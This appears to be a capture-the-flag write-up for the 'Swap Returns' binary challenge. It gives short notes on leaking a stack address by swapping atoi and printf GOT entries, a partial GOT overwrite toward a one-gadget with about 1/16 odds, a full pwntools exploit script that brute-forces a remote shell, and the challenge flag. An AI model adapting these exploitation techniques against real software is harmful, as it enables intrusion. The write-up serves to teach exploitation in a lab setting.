# Swap returns
* Swap `atoi` , `printf` to leak `stack`.
* Swap( a , &a ) -> *a = a.
* Swap( `0x601526` , &`0x601526` ).
* Swap( `0x601526 - 6` , `printf GOT - 6` ).
* `printf -> 0x56510` , `one gadget -> 0x45526`.
* Overwrite `printf GOT` last two byte to `0x1526`, gues it add with carry.
* With probability approx 1/16.
```python
#!/usr/bin/env python
from pwn import *

# TWCTF{unlimited_SWAP_Works}

e = ELF( './swap_returns' )

host , port = 'swap.chal.ctf.westerns.tokyo' , 37567
#y = remote( host , port )

context.arch = 'amd64'

def st( a , b ):
    y.sendafter( ':' , '1' )
    y.sendlineafter( ':' , str( a ) )
    y.sendlineafter( ':' , str( b ) )

def sw( a , b ):
    y.sendlineafter( ':' , str( a ) )
    y.sendlineafter( ':' , str( b ) )


while True:
    y = remote( host , port )

    y.sendafter( ':' , '5' )

    st( e.got['atoi'] , e.got['printf'] )

    y.sendafter( ':' , '2' )
    y.sendlineafter( ':' , '%p' )
    y.recvuntil( '0x' )
    stk = int( y.recvuntil( '1.' )[:-2] , 16 )
    success( 'stk -> %s' % hex( stk ) )
    a = stk + 0x2a
    b = a + 8

    sw( e.got['atoi'] , e.got['printf'] )
    y.sendafter( ':' , '7\n' )

    bss = 0x600000
    st( bss + 0x1526 , a  )
    y.sendafter( ':' , '2' )
    st( bss + 0x1526 - 6 , e.got['printf'] - 6  )
    y.sendafter( ':' , '2' )
    y.sendafter( ':' , '7' )

    try:
        sleep( 0.5 )
        y.sendline( 'echo ABC' )
        print y.recvuntil( 'ABC' )
        y.interactive()
        y.close()
    except:
        y.close()

```